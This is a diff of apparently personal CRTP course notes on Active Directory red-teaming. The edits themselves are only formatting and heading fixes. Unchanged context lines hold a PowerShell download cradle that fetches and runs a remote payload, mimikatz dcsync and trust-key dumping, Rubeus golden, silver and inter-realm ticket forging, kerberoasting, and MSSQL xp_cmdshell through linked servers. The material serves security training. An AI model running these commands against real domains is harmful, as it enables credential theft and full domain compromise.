@@ -28,7 +28,7 @@ Import-Module C:\AD\Tools\ADModulemaster\ActiveDirectory\ActiveDirectory.psd1
 Get-Command -Module <modulename>
 ```
 
-## PowerShell Script Execution — Download Cradles
+## PowerShell Script Execution - Download Cradles
 
 ```powershell
 iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')
@@ -65,7 +65,7 @@ IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
 1. **System-wide transcription**
 2. **Script Block logging**
 3. **AMSI**
-4. **CLM** — Integrated with AppLocker and WDAC (Device Guard)
+4. **CLM** - Integrated with AppLocker and WDAC (Device Guard)
 
 ## Bypassing PowerShell Security
 
@@ -139,7 +139,7 @@ Invoke-FileFinder -Verbose
 Get-NetFileServer
 ```
 
-**PowerHuntShares** ([https://github.com/NetSPI/PowerHuntShares](https://github.com/NetSPI/PowerHuntShares)) — can discover shares, sensitive files, ACLs for shares, networks, computers, identities etc. and generates a nice HTML report:
+**PowerHuntShares** ([https://github.com/NetSPI/PowerHuntShares](https://github.com/NetSPI/PowerHuntShares)) - can discover shares, sensitive files, ACLs for shares, networks, computers, identities etc. and generates a nice HTML report:
 
 ```powershell
 Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools -HostList C:\AD\Tools\servers.txt
@@ -247,26 +247,26 @@ Invoke-SessionHunter -NoPortScan -Targets C:\AD\Tools\servers.txt
 - Above command doesn't need admin access on remote machines. Uses **Remote Registry** and queries `HKEY_USERS` hive.
 
 > In an AD environment, there are multiple scenarios which lead to privilege escalation. We had a look at the following:
-– Hunting for Local Admin access on other machines
-– Hunting for high privilege domain accounts (like a Domain Administrator)
+ -  Hunting for Local Admin access on other machines
+ -  Hunting for high privilege domain accounts (like a Domain Administrator)
 > 
 
 ---
 
-# 5. Privilege Escalation — Local
+# 5. Privilege Escalation - Local
 
 There are various ways of locally escalating privileges on a Windows box:
-– Missing patches
-– Automated deployment and AutoLogon passwords in clear text
-– **AlwaysInstallElevated** (Any user can run MSI as SYSTEM)
-– Misconfigured Services
-– DLL Hijacking and more
-– Kerberos and NTLM Relaying
+ -  Missing patches
+ -  Automated deployment and AutoLogon passwords in clear text
+ -  **AlwaysInstallElevated** (Any user can run MSI as SYSTEM)
+ -  Misconfigured Services
+ -  DLL Hijacking and more
+ -  Kerberos and NTLM Relaying
 
 **Tools for complete coverage:**
-– **PowerUp**: [https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
-– **PrivescCheck**: [https://github.com/itm4n/PrivescCheck](https://github.com/itm4n/PrivescCheck)
-– **winPEAS**: [https://github.com/carlospolop/PEASS-ng/tree/master/winPE](https://github.com/carlospolop/PEASS-ng/tree/master/winPE)AS
+ -  **PowerUp**: [https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
+ -  **PrivescCheck**: [https://github.com/itm4n/PrivescCheck](https://github.com/itm4n/PrivescCheck)
+ -  **winPEAS**: [https://github.com/carlospolop/PEASS-ng/tree/master/winPE](https://github.com/carlospolop/PEASS-ng/tree/master/winPE)AS
 
 ## Service Issues (PowerUp)
 
@@ -288,7 +288,7 @@ There are various ways of locally escalating privileges on a Windows box:
 - **PrivescCheck**: `Invoke-PrivEscCheck`
 - **PEASS-ng**: `winPEASx64.exe`
 
-## GPO Abuse — GPOddity
+## GPO Abuse - GPOddity
 
 Refer page 109
 
@@ -326,7 +326,7 @@ We can use `winrs` in place of PSRemoting to evade the logging (and still reap t
 winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname
 ```
 
-- We can also use `winrm.vbs` and COM objects of WSMan object — [https://github.com/bohops/WSMan-WinRM](https://github.com/bohops/WSMan-WinRM)
+- We can also use `winrm.vbs` and COM objects of WSMan object - [https://github.com/bohops/WSMan-WinRM](https://github.com/bohops/WSMan-WinRM)
 
 ---
 
@@ -342,13 +342,13 @@ winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname
 
 **Credentials extractable without touching LSASS:**
 
-- **SAM hive** (Registry) — Local credentials
-- **LSA Secrets / SECURITY hive** (Registry) — Service account passwords, Domain cached credentials etc.
-- **DPAPI Protected Credentials** (Disk) — Credentials Manager/Vault, Browser Cookies, Certificates, Azure Tokens etc.
+- **SAM hive** (Registry) - Local credentials
+- **LSA Secrets / SECURITY hive** (Registry) - Service account passwords, Domain cached credentials etc.
+- **DPAPI Protected Credentials** (Disk) - Credentials Manager/Vault, Browser Cookies, Certificates, Azure Tokens etc.
 
 ---
 
-# 8. Lateral Movement — Over Pass The Hash
+# 8. Lateral Movement - Over Pass The Hash
 
 ```powershell
 # Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz)
@@ -397,7 +397,7 @@ If **PAC validation** is **disabled** (default in most cases) → attacker can f
 
 ### What is PAC?
 
-**PAC = Privilege Attribute Certificate** — a Microsoft extension to Kerberos tickets that contains **authorization data** about the user:
+**PAC = Privilege Attribute Certificate** - a Microsoft extension to Kerberos tickets that contains **authorization data** about the user:
 
 - Group memberships
 - User rights
@@ -407,7 +407,7 @@ If **PAC validation** is **disabled** (default in most cases) → attacker can f
 
 **Signed by the hash of krbtgt account.**
 
-### Step 1 — Acquire AES Key of the krbtgt account
+### Step 1 - Acquire AES Key of the krbtgt account
 
 ```powershell
 # Execute mimikatz (or a variant) on DC as DA to get krbtgt hash
@@ -422,7 +422,7 @@ C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync
 /user:dcorp\krbtgt" "exit" 
 ```
 
-### Step 2 — Forge the TGT
+### Step 2 - Forge the TGT
 
 ```powershell
 # Use Rubeus to forge a Golden ticket with attributes similar to a normal TGT:
@@ -486,8 +486,8 @@ C:\AD\Tools\Rubeus.exe silver /service:http/dcorpdc.dollarcorp.moneycorp.local /
 - **Golden ticket** was a TGT **forging** attack whereas **diamond ticket** is a TGT **modification** attack.
 - The persistence lifetime depends on the krbtgt account.
 - A diamond ticket is **more opsec safe** as it has:
-    - Valid ticket times because a TGT issued by the DC is modified
-    - In golden ticket, there is no corresponding TGT request for TGS/Service ticket requests as the TGT is forged
+ - Valid ticket times because a TGT issued by the DC is modified
+ - In golden ticket, there is no corresponding TGT request for TGS/Service ticket requests as the TGT is forged
 
 **Diamond Ticket Flow:**
 john requests TGT → DC issues legitimate TGT
@@ -518,9 +518,9 @@ Rubeus.exe diamond
 
 | **Attack** | **Method** | **Signed By** | **Opsec** |
 | --- | --- | --- | --- |
-| Golden Ticket | Forge TGT from scratch | krbtgt hash | Lower — no matching AS-REQ |
-| Silver Ticket | Forge TGS from scratch | Service account hash | Lower — no matching TGS-REQ |
-| Diamond Ticket | Modify legitimate TGT | krbtgt AES key | Higher — valid ticket times |
+| Golden Ticket | Forge TGT from scratch | krbtgt hash | Lower - no matching AS-REQ |
+| Silver Ticket | Forge TGS from scratch | Service account hash | Lower - no matching TGS-REQ |
+| Diamond Ticket | Modify legitimate TGT | krbtgt AES key | Higher - valid ticket times |
 
 ---
 
@@ -600,7 +600,7 @@ C:\AD\Tools\Rubeus.exe asreproast /user:VPN1user
 john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worstpass.txt C:\AD\Tools\asrephashes.txt
 ```
 
-## Targeted Kerberoasting — Setting SPN on User Accounts
+## Targeted Kerberoasting - Setting SPN on User Accounts
 
 Set an SPN on a user account, then perform the Kerberoast attack:
 
@@ -763,21 +763,21 @@ Refer page 156
 
 ![image.png](CRTP%20course/image%2010.png)
 
-### Security Descriptors — WMI
+### Security Descriptors - WMI
 
 (Persistence using ACLs)
 
-### Security Descriptors — PowerShell Remoting
+### Security Descriptors - PowerShell Remoting
 
 (Persistence using ACLs)
 
-### Security Descriptors — Remote Registry
+### Security Descriptors - Remote Registry
 
 (Persistence using ACLs)
 
 ---
 
-# 13. Domain Privilege Escalation — Cross-Domain & Cross-Forest
+# 13. Domain Privilege Escalation - Cross-Domain & Cross-Forest
 
 **sIDHistory** is a user attribute designed for scenarios where a user is moved from one domain to another. When a user's domain is changed, they get a new SID and the old SID is added to sIDHistory.
 
@@ -786,7 +786,7 @@ Refer page 156
 1. **krbtgt hash** of the child
 2. **Trust tickets**
 
-## Method 1 — Trust Key
+## Method 1 - Trust Key
 
 ```powershell
 Attacker has child-parent trust key
@@ -804,7 +804,7 @@ If we have the **trust key**, we can forge an **inter-realm TGT**.
 
 ![image.png](CRTP%20course/image%2012.png)
 
-### Step 1 — Get the Trust Key
+### Step 1 - Get the Trust Key
 
 ```powershell
 SafetyKatz.exe "lsadump::trust /patch"
@@ -814,7 +814,7 @@ SafetyKatz.exe "lsadump::dcsync /user:dcorp\mcorp$"
 SafetyKatz.exe "lsadump::lsa /patch"
 ```
 
-### Step 2 — Forge Inter-Realm TGT
+### Step 2 - Forge Inter-Realm TGT
 
 ```powershell
 C:\AD\Tools\Rubeus.exe silver
@@ -825,7 +825,7 @@ C:\AD\Tools\Rubeus.exe silver
 /user:Administrator /nowrap
 ```
 
-### Step 3 — Use the Forged Ticket
+### Step 3 - Use the Forged Ticket
 
 ```powershell
 C:\AD\Tools\Rubeus.exe asktgs /service:http/mcorpdc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt
@@ -834,7 +834,7 @@ C:\AD\Tools\Rubeus.exe asktgs /service:http/mcorpdc.MONEYCORP.LOCAL /dc:mcorp-dc
 
 ![image.png](CRTP%20course/image%2013.png)
 
-## Method 2 — krbtgt Secret (Golden Ticket with sIDHistory)
+## Method 2 - krbtgt Secret (Golden Ticket with sIDHistory)
 
 ```powershell
 Attacker has child domain krbtgt hash
@@ -894,7 +894,7 @@ C:\AD\Tools\Rubeus.exe asktgs /service:http/mcorpdc.MONEYCORP.LOCAL /dc:mcorp-dc
 /ticket:<FORGED TICKET>
 ```
 
-# Trust Abuse - MSSQL Servers
+# 14. Trust Abuse - MSSQL Servers
 
 ## Recon :
 
@@ -956,7 +956,7 @@ select * from openquery("dcorp-sql1",'select * from openquery("dcorpmgmt",''sele
 @@version as version;exec master..xp_cmdshell "powershell whoami)'''')'')')
 ```
 
-# CA AD
+# 15. Active Directory Certificate Services (ADCS)
 
 ## Implicit mapping
 
@@ -994,10 +994,10 @@ The dangerous conditions are:
 1. Low-privileged users can enroll in the template.
 2. The template allows requester-supplied SAN.
 3. The certificate has an authentication-capable EKU:
-   - Client Authentication
-   - Smart Card Logon
-   - PKINIT Client Authentication
-   - Any Purpose
+ - Client Authentication
+ - Smart Card Logon
+ - PKINIT Client Authentication
+ - Any Purpose
 4. The domain accepts weak/implicit certificate mapping.
 ```
 
@@ -1005,10 +1005,10 @@ The dangerous conditions are:
 1. Low-privileged users can enroll in the template.
 2. The template allows requester-supplied SAN.
 3. The certificate has an authentication-capable EKU:
-   - Client Authentication
-   - Smart Card Logon
-   - PKINIT Client Authentication
-   - Any Purpose
+ - Client Authentication
+ - Smart Card Logon
+ - PKINIT Client Authentication
+ - Any Purpose
 4. The domain accepts weak/implicit certificate mapping.
 ```
 
@@ -1048,11 +1048,11 @@ Then the attacker authenticates as Administrator.
 
 Modern hardening can reduce or block ESC1 if **strong certificate mapping** is enforced, especially when the DC requires the SID security extension. But in weak/compatibility mode, ESC1 is powerful because controlling the SAN can mean controlling **who the cert authenticates as**.
 
-## ECS2
+## ESC2
 
 When a certificate template specifies the Any Purpose EKU, or no EKU at all, the certificate can be used for anything. ESC2 can't be abused like ESC1 if the requester can't specify a SAN, however, it can be abused like ESC3 to use the certificate as requirement to request another one on behalf of any user.
 
-## EC3
+## ESC3
 
 This certificate is allowed to request certificates on behalf of other users.
 
